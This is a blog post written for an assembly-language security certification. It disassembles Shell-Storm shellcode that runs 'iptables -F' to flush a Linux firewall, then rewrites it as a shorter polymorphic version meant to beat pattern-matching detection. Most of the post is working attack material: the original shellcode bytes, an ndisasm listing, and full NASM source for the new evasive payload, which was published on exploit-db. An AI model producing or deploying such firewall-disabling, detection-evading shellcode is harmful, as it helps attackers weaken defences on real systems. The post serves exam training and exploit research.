---
layout: post
title: SLAE 6.2 - Shell-Storm Polymorphism - iptables -F
date:   2019-03-05
categories: [SLAE, Assembly]
---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

The sixth question for the SLAE exam is to create polymorphic versions of 3 shellcodes from Shell-Storm to attempt to beat pattern matching, this is part 2 of 3 for this question.  The requirements are:
* Select a linux/x86 shellcode from Shell-Storm.org
* The polymorphic versions cannot be larger than 150% of the original shellcode
* Bonus points for making it shorter in length

The version that I created from this post was submitted to and accepted by exploit-db.com.  The URL is:
[iptables -f shellcode](https://www.exploit-db.com/shellcodes/46491)


The 2nd piece of shellcode we will try to create a polymorphic version of will be:
[http://shell-storm.org/shellcode/files/shellcode-361.php](http://shell-storm.org/shellcode/files/shellcode-361.php)

The original length is 58 bytes, meaning we have up to 87 bytes maximum to fit in to the exam requirements (no more than 150%).

Let's take a look at the original shellcode and put it through ndisasm just to be sure it does what it claims.
```
jmp	short	callme
main:
	pop	esi
	xor	eax,eax
	mov byte [esi+14],al
	mov byte [esi+17],al
	mov long [esi+18],esi
	lea	 ebx,[esi+15]
	mov long [esi+22],ebx
	mov long [esi+26],eax
	mov 	al,0x0b
	mov	ebx,esi
	lea	ecx,[esi+18]
	lea	edx,[esi+26]
	int	0x80
	

callme:
	call	main
	db '/sbin/iptables#-F#'
```
```
echo -ne '\xeb\x21\x5e\x31\xc0\x88\x46\x0e\x88\x46\x11\x89\x76\x12\x8d\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12\x8d\x56\x1a\xcd\x80\xe8\xda\xff\xff\xff\x2f\x73\x62\x69\x6e\x2f\x69\x70\x74\x61\x62\x6c\x65\x73\x23\x2d\x46\x23' | ndisasm -u -
00000000  EB21              jmp short 0x23
00000002  5E                pop esi
00000003  31C0              xor eax,eax
00000005  88460E            mov [esi+0xe],al
00000008  884611            mov [esi+0x11],al
0000000B  897612            mov [esi+0x12],esi
0000000E  8D5E0F            lea ebx,[esi+0xf]
00000011  895E16            mov [esi+0x16],ebx
00000014  89461A            mov [esi+0x1a],eax
00000017  B00B              mov al,0xb
00000019  89F3              mov ebx,esi
0000001B  8D4E12            lea ecx,[esi+0x12]
0000001E  8D561A            lea edx,[esi+0x1a]
00000021  CD80              int 0x80
00000023  E8DAFFFFFF        call dword 0x2
00000028  2F                das
00000029  7362              jnc 0x8d
0000002B  696E2F69707461    imul ebp,[esi+0x2f],dword 0x61747069
00000032  626C6573          bound ebp,[ebp+0x73]
00000036  23                db 0x23
00000037  2D                db 0x2d
00000038  46                inc esi
00000039  23                db 0x23

```
There is a jump-call-pop to get the string that is used. The #'s are replaced with nulls.  It looks like the strings are then copied to a location after the first string for the args struct as well.  Let's start working on a polymorphic version.

It looks like we can greatly reduce this shellcode if we get rid of all the mov's that copy the string to another location.  We can then just use our already saved reference to the string.

We can use the same technique to store the iptables string in the proper register, jmp-call-pop into EBX.
Then we can zero out EDX with cdq and move a null byte into the '#' location.
```nasm
global _start

section .text

_start:
  jmp short get
code:
  pop ebx
  cdq
  mov [ebx+0xe], dl
get:
  call code
  file: db "/sbin/iptables#-F"
```
Next, we set up the args struct.  The original shellcode copies the string to a location after the original and loads its address to ECX.  It then loads the address of an already used NULL byte in to EDX.
We can just skip all these steps and use our original string.  I will push the addresses to the stack, then move the stack pointer in to the ecx register.  Our edx is already 0'd out from earlier as well.

This is using the same strategy that a normal stack based execve call would use combined with the jmp-call-pop string.  Since we already have addresses stored in registers, it makes sense to do this and greatly reduces our shellcode length.

Also note that in the string variable 'file' above, that we have removed the second '#'.  Our strategy pushes a null byte to the stack before the string address instead of replacing another '#' with a null.  Our code is currently as follows:
```nasm
lea eax, [ebx+0xf]  ; get address of '-F'
push edx            ; null terminate the struct
push eax            ; push -F
push ebx            ; push /sbin/iptables
mov ecx, esp        ; address stored as argument
```
The last steps are to move 0xb into EAX and interrupt (int 0x80).  We can use EDX since it is already null to mov into EAX just for a little variation.  Then mov 0xb into AL and make our syscall.
```nasm
mov eax, edx
mov al, 0xb
int 0x80
```
Let's build it and run it.  The objdump seems to be missing a few bytes in the string from /sbin/iptables.   I decided to manually insert the 'sb' from sbin and the 'a' from iptables, then it worked as expected.  This may have been an issue with the objdump command that I was using from the course video.  This is mentioned in one of the videos and quickly touches on why it happens.  It was mentioned that one of the cut command options can cause problems if the dump has large combinations of opcodes in 1 line.  I went ahead and inserted the bytes on my own but may go back to see if changing the command a bit will get it to work at another time.

The final product has reduced the shellcode by 26%! Let's compare the shellcode side by side.
```nasm
jmp short 0x23                                jmp short 0x15
pop esi                                       pop ebx
xor eax,eax                                   cdq
mov [esi+0xe],al                              mov [ebx+0xe], dl
mov [esi+0x11],al                             lea eax, [ebx+0xf]
mov [esi+0x12],esi                            push edx
lea ebx,[esi+0xf]                             push eax
mov [esi+0x16],ebx                            push ebx
mov [esi+0x1a],eax                            mov ecx, esp
mov al,0xb                                    mov eax, edx
                                              mov al, 0xb
mov ebx,esi                                   
lea ecx,[esi+0x12]                            
lea edx,[esi+0x1a]
int 0x80                                      int 0x80
call dword 0x2                                call dword 0x2
das                                           das
jnc 0x8d                                      jnc 0x7f
imul ebp,[esi+0x2f],dword 0x61747069          imul ebp,[esi+0x2f],dword 0x61747069
bound ebp,[ebp+0x73]                          bound ebp,[ebp+0x73]
db 0x23                                       db 0x23
db 0x2d                                       db 0x2d
inc esi                                       inc esi
db 0x23
```

With the big reduction in size, I decided to check on exploit-db for any similar shellcode with equal or shorter length.  It turns out that there is only 1 other shellcode that was on there with the same length (none shorter).  The already published shellcode uses a full stack approach so I submitted the shellcode in the hopes that it will get accepted, which it did!  The link is above at the top of this post.
